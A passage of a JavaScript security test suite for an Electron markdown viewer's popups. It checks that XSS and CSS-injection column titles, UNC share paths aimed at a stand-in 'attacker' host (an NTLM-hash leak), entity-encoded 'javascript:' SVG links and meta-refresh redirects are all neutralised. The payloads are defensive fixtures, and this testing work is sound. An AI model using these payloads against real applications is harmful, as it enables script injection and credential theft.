  //   - script: `script-src 'nonce-...'` refuses the injected <img onerror>,
  //     so `pwned` stays null with or without the fix. That conjunct is a
  //     control, not the finding.
  //   - markup: an element built from the title is not stopped by any
  //     directive. `titleElements` is the conjunct only the fix satisfies.
  //   - CSS: `style-src 'unsafe-inline'` means an injected <style> APPLIES.
  //     The outline probe is a live, CSP-unmitigated consequence, and it is
  //     deliberately non-destructive so a failure reports one named cause
  //     rather than collapsing the whole document and taking the feature
  //     control down with it.
  //
  // The payload is driven through the real IPC channel with a synthetic
  // tableData on purpose: `open-table-popup` is the trust boundary, and it
  // already treats this payload as hostile (toJsonLiteral). Escaping in the
  // renderer's extractTableData() instead would fix one producer and leave the
  // boundary trusting its input - and it would also put &lt; into the popup's
  // own CSV/JSON export, which reads the column title verbatim.
  // ==========================================================================
  // THE FIXTURE IS WIDE, AND THAT IS LOAD-BEARING. `columnDefaults` guards the
  // rendered HEADER, but `definition.title` has more than one reader in 6.5.2
  // and the others only become reachable once columns are hidden or hovered:
  //   - responsiveLayout: "collapse" (set by this popup) builds a panel from
  //     the RAW definition - generateCollapsedRowData pushes
  //     `title: o.definition.title`, then formatCollapsedData runs
  //     `r.innerHTML = t || e.title`. No title formatter is consulted at all.
  //   - headerTooltip: true resurrects the raw title through loadTooltip's
  //     `s.innerHTML = i`, with the attacker supplying no markup beyond the
  //     title itself. A BOOLEAN is enough, so no amount of value-scrubbing can
  //     close it - only refusing the key can.
  //   - a per-column titleFormatter WINS over columnDefaults: mapDefinitions
  //     fills only keys left `undefined`, and formatHeader tests truthiness.
  //     Measured in the bundle: formatters.html is `return e.getValue()`, i.e.
  //     raw, and it resolves without a console warning.
  // The one-column fixture this block started with could not reach any of
  // them, which is the whole reason they survived a review that was looking
  // directly at the title sink.
  //
  // 80 columns: measured at the shipped popup size (1400x900), collapse begins
  // at 34 columns at DPR 1.25 and around 42 at DPR 1.0. The count sits far
  // above both, because a fixture whose trigger depends on display scaling
  // gives intermittent verdicts and a revert record cannot be anchored to one.
  // Hostile titles sit at BOTH ends deliberately: the leading columns stay
  // visible (header, formatter-override and tooltip sinks) and the trailing
  // one is hidden (collapse-panel sink).
  const SEC31_TITLE =
    'Name<img src="x" onerror="window.__pwned=\'title\'">' +
    "<style>#data-table{outline:7px solid rgb(1,2,3)}</style>";
  const SEC31_COLS = 80;
  const sec31Columns = [
    { title: SEC31_TITLE, field: "col0" },
    { title: SEC31_TITLE, field: "col1", titleFormatter: "html" },
    { title: SEC31_TITLE, field: "col2", headerTooltip: true },
  ];
  for (let i = sec31Columns.length; i < SEC31_COLS - 1; i++) {
    sec31Columns.push({ title: "C" + i, field: "col" + i });
  }
  sec31Columns.push({ title: SEC31_TITLE, field: "col" + (SEC31_COLS - 1) });
  const sec31Row = {};
  for (let i = 0; i < SEC31_COLS; i++) sec31Row["col" + i] = "cell" + i;
  popup = await openPopup(
    "open-table-popup",
    {
      tableData: { data: [sec31Row], columns: sec31Columns },
      isDarkMode: false,
    },
    2200,
  );
  if (popup) {
    check("SEC-31 table popup opens for a hostile column title", true);
    const title = await popupEval(
      popup,
      `(() => {
         const holder = document.querySelector('.tabulator-col-title');
         const host = document.getElementById('data-table');
         const read = () => {
           const cs = getComputedStyle(host);
           return { w: cs.outlineWidth, c: cs.outlineColor };
         };
         const hostile = host ? read() : null;
         // Positive control. The table popup's CSP is
         // style-src 'unsafe-inline', so an injected <style> that really
         // reaches the document DOES apply - which is the whole reason the
         // hostile reading above is meaningful. Prove that here rather than
         // assuming it: without this, "the payload's colour is absent" would
         // also be satisfied by a probe that cannot observe an outline at all,
         // by a missing #data-table, or by a CSP that silently refused every
         // style. Deliberately a DIFFERENT colour from the payload so the two
         // readings can never be confused with one another.
         //
         // Appended to BODY, not HEAD, and that is load-bearing. Both this rule
         // and a hostile one are '#data-table', i.e. identical specificity, so
         // DOCUMENT ORDER decides - and the payload's <style> lives inside the
         // column title, in the body, after the head. A head-appended control
         // is therefore OUTRANKED by the very injection it exists to detect,
         // which makes the assertion fail on BOTH conjuncts at once and turns
         // its verdict into a disjunction: "the payload applied" and "the
         // control could not be observed" become indistinguishable. Measured
         // under R503 before this was changed - the control read rgb(1, 2, 3),
         // the payload's own colour. Appending last makes the control win
         // whenever the channel works at all, so exactly one conjunct can fail
         // and the failure names the finding.
         let control = null;
         if (host) {
           const s = document.createElement('style');
           // !important, and that is not belt-and-braces. Document order only
           // decides between rules of EQUAL priority: a payload written as
           // '#data-table{outline:...!important}' would outrank a later plain
           // rule and collapse this control back into the disjunction the
           // paragraph above says it fixes. A later !important beats an
           // earlier one, so appending last AND raising priority makes the
           // control win unconditionally, for any payload.
           s.textContent = '#data-table{outline:7px solid rgb(9,8,7) !important}';
           document.body.appendChild(s);
           control = read();
           s.remove();
         }
         return {
           found: !!holder,
           titleElements: holder ? holder.querySelectorAll('*').length : -1,
           titleText: holder ? holder.textContent : null,
           hostileOutline: hostile,
           controlOutline: control,
           rows: document.querySelectorAll('.tabulator-row').length,
           tabulatorLoaded: typeof window.Tabulator !== 'undefined',
         };
       })()`,
    );
    // Non-vacuity: without `found` and `titleText`, a header that never
    // rendered at all would satisfy "no element children" for the worst
    // possible reason. The literal-text conjunct is what proves the markup was
    // PAINTED AS TEXT rather than swallowed.
    check(
      "SEC-31 a hostile column title renders as text, not markup",
      title &&
        title.found === true &&
        title.titleElements === 0 &&
        typeof title.titleText === "string" &&
        title.titleText.includes("<img") &&
        title.titleText.includes("<style>"),
      JSON.stringify(title),
    );
    // The oracle names the PAYLOAD's own colour rather than asserting a bare
    // "0px". Measured: #data-table carries an unrelated resting outline
    // (2.4px rgb(31,50,68) at DPR 1.25), so "no outline at all" was an
    // assumption and a wrong one. The control conjunct is what stops the
    // negative reading failing open.
    check(
      "SEC-31 a column title cannot inject CSS past style-src 'unsafe-inline'",
      title &&
        title.hostileOutline &&
        title.hostileOutline.c !== "rgb(1, 2, 3)" &&
        title.controlOutline &&
        title.controlOutline.c === "rgb(9, 8, 7)",
      JSON.stringify(title && {
        hostile: title.hostileOutline,
        control: title.controlOutline,
      }),
    );
    const pwnedTitle = await pwned(popup);
    // This popup's OWN channel control. The one in the SEC-06 block is on a
    // different BrowserWindow and window globals do not cross windows, so
    // without this the negative below is an absence failing open.
    const titleChan = await pwnedChannelLive(popup);
    check(
      "SEC-31 the __pwned read channel is observable in the title popup too",
      titleChan.ok === true,
      JSON.stringify(titleChan),
    );
    check(
      "SEC-31 the popup CSP still refuses an inline handler in a column title",
      pwnedTitle === null,
      JSON.stringify(pwnedTitle),
    );
    // ========================================================================
    // THE DOCUMENT-WIDE SWEEP. Everything above reads
    // `.tabulator-col-title` - and that selector is exactly why two further
    // live title sinks sat undetected while this block was being written and
    // reviewed. An oracle scoped to the one place a fix is known to work
    // cannot report the places it does not. This sweep is deliberately
    // scoped to the whole document instead, so the next sink is caught
    // without anyone having to think of it first.
    //
    // Each needle has a MEASURED zero baseline rather than an assumed one:
    //   - img/iframe/object/embed/link: the popup markup contains none.
    //   - style: the only legitimate <style> is the inlined Tabulator CSS,
    //     and it lives in <head>, so a body-scoped count starts at zero.
    //   - script:not([nonce]): the one legitimate script carries the nonce.
    //   - svg is counted INSIDE #data-table only, because the toolbar has
    //     three legitimate inline <svg> icons in the body. Counting those as
    //     injections would have made this assertion wrong by construction.
    // ========================================================================
    await hoverColumn(popup, "col2");
    const initialTip = await popupEval(popup, `(() => {
      const tip=document.querySelector('.tabulator-tooltip');
      return {found:!!tip,elements:tip?tip.querySelectorAll('*').length:-1};
    })()`);
    // The allow-list deliberately leaves no subscriber. Force the real lexical
    // Tabulator column through updateDefinition, then hover again through
    // Electron input, so the escaping leg cannot pass merely by lacking a sink.
    const forcedOk = await popupEval(popup, `(async () => {
      const tbl=typeof table!=='undefined'?table:null, col2=tbl&&tbl.getColumn('col2');
      if(!col2)return false;
      await col2.updateDefinition({headerTooltip:true});
      return true;
    })()`);
    if (forcedOk === true) await hoverColumn(popup, "col2");
    const sweep = await popupEval(
      popup,
      `(() => {
         const cols = document.querySelectorAll('.tabulator-col');
         const forcedOk=${forcedOk === true};
         const ftip=document.querySelector('.tabulator-tooltip');
         const forcedTipFound=!!ftip;
         const forcedTipElements=ftip?ftip.querySelectorAll('*').length:-1;
         const forcedTipText=ftip?ftip.textContent:'';
         const panel = document.querySelector('.tabulator-responsive-collapse');
         const host = document.getElementById('data-table');
         const countHandlerAttrs = () =>
           Array.prototype.filter.call(document.querySelectorAll('*'), (el) =>
             el.getAttributeNames().some((a) => a.slice(0, 2) === 'on'),
           ).length;
         const handlerProbe = document.createElement('b');
         handlerProbe.setAttribute('onerror', 'void 0');
         document.body.appendChild(handlerProbe);
         const probedHandlerAttrs = countHandlerAttrs();
         handlerProbe.remove();
         return {
           visibleCols: cols.length,
           // Proves the collapse panel is actually POPULATED. Without this the
           // "no injected elements in the panel" reading would be satisfied by
           // a panel that never had any columns to show.
           panelStrongs: panel ? panel.querySelectorAll('strong').length : -1,
           // Every element descendant of every collapse-panel <strong>. The
           // tag-name needle list below is a fixed set; this is not, so a
           // payload built from <b>, <a>, <div> or <table> is still counted.
           panelTitleElements: panel
             ? Array.prototype.reduce.call(
                 panel.querySelectorAll('strong'),
                 (n, s) => n + s.querySelectorAll('*').length,
                 0,
               )
             : -1,
           panelText: panel ? panel.textContent : '',
           tipFound: ${initialTip.found === true},
           tipElements: ${Number.isInteger(initialTip.elements) ? initialTip.elements : -1},
           forcedOk: forcedOk,
           forcedTipFound: forcedTipFound,
           forcedTipElements: forcedTipElements,
           forcedTipHasRawText: forcedTipText.indexOf('<img') !== -1,
           bodyInjected: document.body.querySelectorAll(
             'img,style,iframe,object,embed,link,script:not([nonce])',
           ).length,
           tableSvgs: host ? host.querySelectorAll('svg').length : -1,
           // MEASURED ORACLE CORRECTION. This was
           // document.body.innerHTML.includes('onerror='), which cannot tell
           // an ATTRIBUTE from TEXT: once the title is escaped it renders as a
           // text node, and serialising that node back through innerHTML
           // re-emits the literal characters onerror= - so the FIXED tree
           // failed its own test (bodyInjected 0, tableSvgs 0, onerror true).
           // Attributes are now asked for structurally, which text cannot
           // satisfy. handlerProbed is the positive control: an absence check
           // fails open, so the detector is required to detect a planted
           // handler in the same sweep that reports none in the product.
           handlerAttrs: countHandlerAttrs(),
           handlerProbed: probedHandlerAttrs,
         };
       })()`,
    );
    // Non-vacuity for the whole sweep. `panelStrongs` is the exact count of
    // columns the responsive layout hid AND rendered into the collapse panel,
    // so a value between zero and the column count proves both that collapse
    // fired and that it did not swallow everything - the preconditions without
    // which the injection readings below would be absences for the wrong
    // reason.
    //
    // MEASURED CORRECTION: `.tabulator-col` is NOT a count of visible columns.
    // A hidden column keeps its header element in the DOM and is merely
    // display:none, so that selector returned all 80 with 47 hidden. It is
    // kept as evidence only; asserting on it was an oracle bug, not a finding.
    check(
      "SEC-31 the wide fixture really does collapse columns into a panel",
      sweep && sweep.panelStrongs > 0 && sweep.panelStrongs < SEC31_COLS,
      JSON.stringify(sweep && {
        panelStrongs: sweep.panelStrongs,
        of: SEC31_COLS,
        colElements: sweep.visibleCols,
      }),
    );
    check(
      "SEC-31 no hostile column title builds an element ANYWHERE in the popup",
      sweep &&
        sweep.bodyInjected === 0 &&
        sweep.tableSvgs === 0 &&
        sweep.panelTitleElements === 0 &&
        sweep.handlerAttrs === 0 &&
        sweep.handlerProbed === 1,
      JSON.stringify(sweep && {
        bodyInjected: sweep.bodyInjected,
        tableSvgs: sweep.tableSvgs,
        panelTitleElements: sweep.panelTitleElements,
        handlerAttrs: sweep.handlerAttrs,
        handlerProbed: sweep.handlerProbed,
      }),
    );
    // The paint-as-text conjunct for the collapse panel. The counts above are
    // absences; this is the positive reading that the hostile title arrived
    // there and was rendered as CHARACTERS.
    check(
      "SEC-31 the collapse panel paints the hostile title as text",
      sweep && sweep.panelText.indexOf("<img") !== -1,
      JSON.stringify(sweep && { panelTextHasRaw: sweep.panelText.indexOf("<img") !== -1 }),
    );
    // Split from the old single assertion, which was a disjunction: it passed
    // if EITHER no tooltip existed OR a tooltip existed with no elements, and
    // post-fix the first leg is a structural certainty. Leg 1 is the
    // allow-list; leg 2 is the escaping.
    check(
      "SEC-31 the allow-list drops headerTooltip, so no tooltip is wired at all",
      sweep && sweep.tipFound === false,
      JSON.stringify(sweep && { tipFound: sweep.tipFound, tipElements: sweep.tipElements }),
    );
    check(
      "SEC-31 even a FORCED tooltip renders the column title as text, not markup",
      sweep &&
        sweep.forcedOk === true &&
        sweep.forcedTipFound === true &&
        sweep.forcedTipElements === 0 &&
        sweep.forcedTipHasRawText === true,
      JSON.stringify(sweep && {
        forcedOk: sweep.forcedOk,
        forcedTipFound: sweep.forcedTipFound,
        forcedTipElements: sweep.forcedTipElements,
        forcedTipHasRawText: sweep.forcedTipHasRawText,
      }),
    );
    check(
      "FEATURE table popup still builds the table under a hostile title",
      title && title.tabulatorLoaded === true && title.rows > 0,
      JSON.stringify(title && { rows: title.rows, t: title.tabulatorLoaded }),
    );
  } else {
    check("SEC-31 table popup opens for a hostile column title", false, "no window");
  }
  await closeAll();

  // ==========================================================================
  // Remote share paths in the image popup. On Windows an <img> pointing at a
  // UNC path makes Chromium perform an SMB fetch with no user interaction,
  // leaking the current user's NTLM hash to a host the author chose.
  // ==========================================================================
  const SHARE_CASES = [
    ["UNC backslash", "\\\\attacker\\share\\x.png"],
    ["protocol-relative", "//attacker/share/x.png"],
    ["file:// with host", "file://attacker/share/x.png"],
    ["file://// with host", "file:////attacker/share/x.png"],
    ["extended UNC", "\\\\?\\UNC\\attacker\\share\\x.png"],
  ];
  for (const [label, src] of SHARE_CASES) {
    popup = await openPopup("open-image-popup", { src, alt: "x", isDarkMode: false }, 1200);
    if (!popup) {
      check(`SEC-04 image popup drops ${label}`, false, "no window");
      continue;
    }
    const got = await popupEval(
      popup,
      `(() => { const i = document.getElementById('the-img'); return i ? i.getAttribute('src') : null; })()`,
    );
    check(`SEC-04 image popup drops ${label}`, got === "", JSON.stringify(got));
    await closeAll();
  }

  // The same helper must not throw away legitimate local sources.
  const KEEP_CASES = [
    ["drive path", imageFile],
    ["file url", pathToFileURL(imageFile).href],
    ["relative path", path.join("..", path.basename(fixtureDir), "ordinary.svg")],
    ["https url", "https://example.invalid/d.png"],
  ];
  for (const [label, src] of KEEP_CASES) {
    popup = await openPopup("open-image-popup", { src, alt: "x", isDarkMode: false }, 1200);
    if (!popup) {
      check(`FEATURE image popup keeps ${label}`, false, "no window");
      continue;
    }
    const got = await popupEval(
      popup,
      `(() => { const i = document.getElementById('the-img'); return i ? i.getAttribute('src') : null; })()`,
    );
    check(`FEATURE image popup keeps ${label}`, got === src, JSON.stringify(got));
    if (label !== "https url") {
      const decoded = await popupEval(popup, `(() => {
        const img=document.getElementById('the-img');
        return !!img&&img.complete&&img.naturalWidth===120&&img.naturalHeight===60;
      })()`);
      check(`FEATURE image popup decodes the owned ${label}`, decoded === true, decoded);
    }
    await closeAll();
  }

  // ==========================================================================
  // Bridge scoping - each popup should get only the API it needs, so script in
  // one popup cannot drive another popup's privileged path.
  // ==========================================================================
  const BRIDGE_CASES = [
    ["mermaid", "open-mermaid-popup", { svgContent: "<svg xmlns='http://www.w3.org/2000/svg'></svg>", isDarkMode: false }, ["exportMermaidPdf"]],
    ["image", "open-image-popup", { src: pathToFileURL(imageFile).href, alt: "a", isDarkMode: false }, ["saveImage"]],
    ["table", "open-table-popup", { tableData: { columns: [{ title: "A", field: "a" }], data: [{ a: "1" }] },
      isDarkMode: false }, null],
  ];
  for (const [label, channel, payload, expected] of BRIDGE_CASES) {
    popup = await openPopup(channel, payload, 1200);
    if (!popup) {
      check(`SEC-08 ${label} popup exposes only its own bridge API`, false, "no window");
      continue;
    }
    const keys = await popupEval(
      popup,
      `window.popupBridge ? Object.keys(window.popupBridge).sort() : null`,
    );
    check(
      `SEC-08 ${label} popup exposes only its own bridge API`,
      expected === null ? keys === null : Array.isArray(keys) && keys.join(",") === expected.sort().join(","),
      JSON.stringify(keys),
    );
    await closeAll();
  }

  // ==========================================================================
  // Save-image payload validation. Only the rejection paths are exercised:
  // a valid payload opens a native save dialog, which would block the harness
  // forever.
  // ==========================================================================
  popup = await openPopup("open-image-popup", { src: pathToFileURL(imageFile).href, alt: "a", isDarkMode: false }, 1200);
  if (popup) {
    const savesBefore = nativeSaveCalls;
    const bad = await popupEval(
      popup,
      `new Promise((resolve) => {
         window.popupBridge.saveImage('data:text/html;base64,PHNjcmlwdD4=', 'png', resolve);
         setTimeout(() => resolve({ timedOut: true }), 4000);
       })`,
    );
    check(
      "SEC-05 image save refuses a non-image data URL",
      bad && bad.success === false && !bad.timedOut,
      JSON.stringify(bad),
    );

    const notDataUrl = await popupEval(
      popup,
      `new Promise((resolve) => {
         window.popupBridge.saveImage(${JSON.stringify(pathToFileURL(readableFile).href)}, 'png', resolve);
         setTimeout(() => resolve({ timedOut: true }), 4000);
       })`,
    );
    check(
      "SEC-05 image save refuses a non-data-URL payload",
      notDataUrl && notDataUrl.success === false && !notDataUrl.timedOut,
      JSON.stringify(notDataUrl),
    );
    check("SEC-05 invalid image saves never reach any native Save chooser",
      savesBefore === 0 && nativeSaveCalls === 0, { savesBefore, nativeSaveCalls });
  } else {
    check("SEC-05 image save refuses a non-image data URL", false, "no window");
  }
  await closeAll();

  // ==========================================================================
  // Entity-encoded scheme in SVG. The javascript: strip used to run before the
  // parser decodes character references, so `javascript&#58;` survived it.
  // ==========================================================================
  const ENTITY_CASES = [
    ["numeric decimal", "javascript&#58;window.__pwned=1"],
    ["numeric hex", "javascript&#x3a;window.__pwned=1"],
    ["named colon entity", "javascript&colon;window.__pwned=1"],
  ];

  for (const [label, hostileHref] of ENTITY_CASES) {
    popup = await openPopup(
      "open-mermaid-popup",
      {
        svgContent:
          "<svg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='80' height='40'>" +
          `<a id='evil' xlink:href='${hostileHref}'><rect width='80' height='40'/></a></svg>`,
        isDarkMode: false,
      },
      1600,
    );
    if (popup) {
      const href = await popupEval(
        popup,
        `(() => {
           const a = document.getElementById('evil');
           if (!a) return null;
           return a.getAttribute('xlink:href') || a.getAttribute('href') || '';
         })()`,
      );
      check(
        `SEC-07 ${label} javascript scheme is stripped from SVG`,
        typeof href === "string" && !/javascript\s*:/i.test(href),
        JSON.stringify(href),
      );
    } else {
      check(`SEC-07 ${label} javascript scheme is stripped from SVG`, false, "no window");
    }
    await closeAll();
  }

  // ==========================================================================
  // SEC-11 (popups) - refresh sanitization, then independent navigation actors.
  // Main strips meta elements before generating this document. A stable URL in
  // these markup cases is NOT evidence that a navigation guard was exercised;
  // inspect the generated source and live DOM while retaining ordinary SVG.
  // The real location/window.open actors below cover navigation separately.
  // ==========================================================================
  const NAV_PAYLOADS = [
    [
      "meta refresh",
      "<svg xmlns='http://www.w3.org/2000/svg' width='40' height='40'>" +
        "<rect id='refresh-control' width='40' height='40' fill='green'/></svg>" +
        "<meta http-equiv='refresh' content=\"0;url=https://" + PROBE_HOST + "/meta-probe\">",
    ],
    [
      "meta refresh inside foreignObject",
      "<svg xmlns='http://www.w3.org/2000/svg' width='40' height='40'>" +
        "<rect id='refresh-control' width='40' height='40' fill='green'/>" +
        "<foreignObject width='40' height='40'>" +
        "<meta http-equiv='refresh' content=\"0;url=https://" + PROBE_HOST + "/foreign-probe\">" +
        "</foreignObject></svg>",
    ],
  ];

  for (const [label, svgContent] of NAV_PAYLOADS) {
    popup = await openPopup("open-mermaid-popup", { svgContent, isDarkMode: false }, 1500);
    if (!popup) {
      check(`SEC-11 mermaid popup survives ${label}`, false, "no window");
      continue;
    }
    const record = windows.get(popup.id);
    const refreshMeta = /<meta\b[^>]*http-equiv=['"]refresh['"]/i;
    const insideForeignObject = label === "meta refresh inside foreignObject";
    check(
      `SEC-11 ${label} fixture reaches Main with its hostile refresh target`,
      record.receipt.payload.svgContent === svgContent && refreshMeta.test(svgContent) &&
        svgContent.includes("url=https://" + PROBE_HOST + "/") &&
        (!insideForeignObject || /<foreignObject\b[^>]*>\s*<meta\b/i.test(svgContent)),
      svgContent,
    );
    const generated = fs.readFileSync(fileURLToPath(record.originalURL), "utf8");
    const sanitized = await popupEval(popup, `(() => {
      const control=document.querySelector('#viewport #refresh-control'), rect=control?.getBoundingClientRect();
      return {control:!!rect&&rect.width>0&&rect.height>0,
        foreignObject:!!document.querySelector('#viewport foreignObject'),
        refresh:[...document.querySelectorAll('meta[http-equiv]')].some(meta=>
          meta.getAttribute('http-equiv').toLowerCase()==='refresh')};
    })()`);
    // A missed refresh still has time to reveal itself, but URL stability is
    // only a companion invariant, not a claimed navigation-guard proof.
    await new Promise((r) => setTimeout(r, 2500));
    const url = popup.isDestroyed() ? "<destroyed>" : popup.webContents.getURL();
    check(
      `SEC-11 mermaid popup strips ${label} before loading its generated document`,
      !refreshMeta.test(generated) && !generated.includes(PROBE_HOST) &&
        sanitized.control === true && sanitized.refresh === false &&
        sanitized.foreignObject === insideForeignObject &&
        !popup.isDestroyed() && popup.webContents === record.wc && url === record.originalURL,
      JSON.stringify({ sanitized, url }),
    );
    await closeAll();
  }

  // Same class, driven from script rather than markup: even if something did
  // execute, the window must not be able to relocate itself.
  popup = await openPopup(
    "open-mermaid-popup",
    { svgContent: "<svg xmlns='http://www.w3.org/2000/svg'></svg>", isDarkMode: false },
    1500,
  );
  if (popup) {
    const relocation = await popupEval(popup, `(() => { try { location.href = 'https://${PROBE_HOST}/js-probe'; } catch (e) {} return 1; })()`);
    check("SEC-11 the location-assignment actor actually executed", relocation === 1, relocation);
    await new Promise((r) => setTimeout(r, 2000));
    const url = popup.isDestroyed() ? "<destroyed>" : popup.webContents.getURL();
    const record = windows.get(popup.id);
    check(
      "SEC-11 mermaid popup cannot be navigated away by location assignment",
      !popup.isDestroyed() && popup.webContents === record.wc && url === record.originalURL,
      url.slice(0, 140),
    );
    // window.open must not spawn a second, unguarded window either.
    const before = BrowserWindow.getAllWindows().length;
    const newWindow = await popupEval(popup, `(() => { try { window.open('https://${PROBE_HOST}/open-probe'); } catch (e) {} return 1; })()`);
    check("SEC-11 the window.open actor actually executed", newWindow === 1, newWindow);
    await new Promise((r) => setTimeout(r, 1200));
    check(
      "SEC-11 mermaid popup cannot open a new window",
      BrowserWindow.getAllWindows().length === before &&
        popup.webContents === record.wc && record.wc.getURL() === record.originalURL,
      `${before} -> ${BrowserWindow.getAllWindows().length}`,
    );
  } else {
    check("SEC-11 mermaid popup cannot be navigated away by location assignment", false, "no window");
  }
  await closeAll();

  // ==========================================================================
  // FEATURE regression for the two controls added above. The table popup's CSV
  // and JSON export builds a Blob and clicks an <a download>. Both the CSP
  // (`default-src 'none'` plus a blob: allowance) and the navigation guards
  // could plausibly kill that, and it would fail silently in normal use. Assert
  // a download actually starts.
  // ==========================================================================
  popup = await openPopup(
    "open-table-popup",
    {
      tableData: {
        data: [{ a: "1", b: "x" }],
        columns: [
          // Special characters ON PURPOSE. titleDownload is the entire
          // justification for storing HTML-ESCAPED text in `title`: the claim
          // is that processColumnGroup prefers definition.titleDownload, so
          // exports keep the document's original characters while every
          // RENDERED copy stays inert. With plain "A"/"B" titles that claim was
          // untested - a misspelled key, an unregistered option, or an upstream
          // change to colVisPropAttach would put &amp;/&lt; into every export
          // and the whole suite would still pass. Include the actual CSV
          // delimiter so preserving raw text must also preserve its quoting.
          { title: 'R&D, <x> "q"', field: "a" },
          { title: "B", field: "b" },
        ],
      },
      isDarkMode: false,
    },
    2200,
  );
  if (popup) {
    const started = [];
    const finished = [];
    const dlDir = tempDir("mdv-dl-");
    ownedFixtures.add(dlDir);
    const record = windows.get(popup.id);
    const onWillDownload = (event, item, source) => {
      try {
        const allowance = downloadAllowance;
        if (!allowance || allowance.source !== source || source !== record.wc ||
            item.getFilename() !== allowance.name || source.getURL() !== record.originalURL) {
          event.preventDefault();
          fatal(new Error("table export observer received a different source/filename")); return;
        }
        assertDocumentScope(allowance.scope);
        const name = allowance.name;
        const complete = allowance.complete;
        allowance.item = item;
        pendingDownloads.add(item);
        started.push(name);
        // Observe before the production listener can preventDefault. A start is
        // still recorded on a denied export; only completed bytes prove success.
        item.once("done", (_ev, state) => {
          let text = null, readError = null;
          try {
            text = fs.readFileSync(path.join(dlDir, name), "utf8");
          } catch (error) { readError = error.message; }
          finished.push({ name, state, text, readError });
          pendingDownloads.delete(item);
          complete();
        });
      } catch (error) {
        event.preventDefault();
        fatal(new Error("table export could not retain its exact download item: " + error.message));
      }
    };
    record.wc.session.prependListener("will-download", onWillDownload);
    const removeDownload = () => record.wc.session.removeListener("will-download", onWillDownload);
    downloadObservers.add(removeDownload);
    const clickExport = async (name, button) => {
      let complete;
      const done = new Promise(resolve => { complete = resolve; });
      const allowance = downloadAllowance = { source: record.wc, originalURL: record.originalURL,
        scope: record.scope, directory: dlDir, name, consumed: false, complete, item: null };
      try {
        const clicked = await popupEval(popup, `(() => {
          const button=document.getElementById(${JSON.stringify(button)});
          if(!button||button.disabled)return false;
          button.click();return true;
        })()`);
        if (clicked !== true) throw new Error("real export button is not wired: " + button);
        await bounded(Promise.race([done, sleep(4000)]), "bounded export completion", 4500);
        assertDocumentScope(record.scope);
        if (!finished.some(entry => entry.name === name)) {
          // preventDefault invalidates the DownloadItem without promising a
          // done event. Preserve the start, not a fictitious completion, and
          // continue to both export/content assertions and the policy matrix.
          let cancelError = null;
          if (allowance.item && pendingDownloads.has(allowance.item)) {
            try { allowance.item.cancel(); } catch (error) { cancelError = error.message; }
          }
          if (!finished.some(entry => entry.name === name)) {
            finished.push({ name, state: "completion-bound-expired", text: null, cancelError });
          }
        }
      } finally {
        downloadAllowance = null;
      }
    };

    await clickExport("table-export.csv", "exportCsvBtn");
    check(
      "FEATURE table popup CSV export still starts a download under CSP",
      started.some((n) => /\.csv$/i.test(n)),
      JSON.stringify(started),
    );
    check(
      "FEATURE table popup CSV export completes, so SEC-30's guard admits it",
      finished.some((f) => /\.csv$/i.test(f.name) && f.state === "completed"),
      JSON.stringify(finished.map((f) => ({ name: f.name, state: f.state }))),
    );
    // The titleDownload premise, measured rather than assumed. `title` holds
    // HTML-ESCAPED text so that every innerHTML reader in Tabulator is inert;
    // the ONLY thing that keeps exports faithful to the document is that
    // processColumnGroup prefers definition.titleDownload. If that preference
    // ever stops holding, this is the assertion that says so - the export
    // would carry "R&amp;D, &lt;x&gt;" instead of the original characters.
    //
    // The expected cell is MEASURED from the bundle's own CSV writer, not
    // guessed: header cells are emitted as
    //   '"' + String(value).split('"').join('""') + '"'
    // so the doubled inner quotes below are CSV quoting, not escaping. An
    // exact two-column header pins the comma INSIDE the first quoted field as
    // distinct from the separator between fields, without another CSV parser.
    const csv = finished.find((f) => /\.csv$/i.test(f.name) && f.text);
    const csvHeader = csv ? csv.text.split(/\r?\n/)[0].replace(/^\uFEFF/, "") : null;
    check(
      "SEC-31 the CSV export carries the RAW column title, not the escaped one",
      !!csv &&
        csvHeader === '"R&D, <x> ""q""","B"' &&
        !csv.text.includes("&amp;") &&
        !csv.text.includes("&lt;"),
      JSON.stringify({
        header: csvHeader,
      }),
    );

    await clickExport("table-export.json", "exportJsonBtn");
    check(
      "FEATURE table popup JSON export still starts a download under CSP",
      started.some((n) => /\.json$/i.test(n)),
      JSON.stringify(started),
    );
    check(
      "FEATURE table popup JSON export completes, so SEC-30's guard admits it",
      finished.some((f) => /\.json$/i.test(f.name) && f.state === "completed"),
      JSON.stringify(finished),
    );
    const json = finished.find(item => item.name === "table-export.json" && item.state === "completed");
    let jsonData;
    try { jsonData = JSON.parse(json?.text); } catch { jsonData = null; }
    check("FEATURE table popup JSON export preserves the real re-keyed row data",
      Array.isArray(jsonData) && jsonData.length === 1 && jsonData[0].col0 === "1" && jsonData[0].col1 === "x",
      jsonData);
    removeDownload();
    downloadObservers.delete(removeDownload);
  } else {
    check("FEATURE table popup CSV export still starts a download under CSP", false, "no window");
  }
  await closeAll();

  // ---------------------------------------------------------------------
  // Theme carried by the REAL renderer -> popup path.
  //
  // Every other case in this file calls openPopup(), which sends the IPC
  // message straight to main.js with isDarkMode hardcoded false. That is the
  // right call for CSP and injection testing, but it means the flag the app
  // actually computes is never exercised - the suite would stay green if the
  // renderer stopped sending the theme entirely, and every popup would open
  // white against a dark app.
  //
  // That is not hypothetical. The mermaid theme bug fixed earlier in this fork
  // was exactly this shape: a theme value that was correct wherever the tests
  // looked and wrong on the path a user takes. So this section clicks the real
  // buttons in a real rendered document, in both themes, and asserts the popup
  // came up in the matching one.
  for (const wantDark of [true, false]) {
    const label = wantDark ? "dark" : "light";
    const themeId = wantDark ? "default-dark" : "default-light";
    await mainEval(`window.foliaThemes.setScheme(${JSON.stringify(themeId)}); true`);
    await waitUntil(() => publishedTheme === themeId, "actual Main theme publication");
    await mainEval("(async () => { await whenMermaidSettled(); return true; })()");
    await waitUntil(async () => (await mainEval(`(() => {
      const svg=document.querySelector('#viewer .mermaid svg');
      return document.body.classList.contains('dark-mode')===${wantDark}&&
        document.querySelectorAll('.table-maximize-btn').length===1&&
        document.querySelectorAll('.mermaid-maximize-btn').length===1&&
        document.querySelectorAll('.img-zoom-btn').length===1&&
        !!svg&&svg.textContent.includes('PopA')&&svg.textContent.includes('PopB');
    })()`)) === true, "theme repaint and all real popup buttons", 10000);
    const parsed = await mainEval(
      `(() => {
        return {
          dark: document.body.classList.contains('dark-mode'),
          table: document.querySelectorAll('.table-maximize-btn').length,
          mermaid: document.querySelectorAll('.mermaid-maximize-btn').length,
          image: document.querySelectorAll('.img-zoom-btn').length,
          path:currentFilePath, markdown:originalMarkdown,
          descriptor:window.CustomTabs.getDocumentDescriptor(),
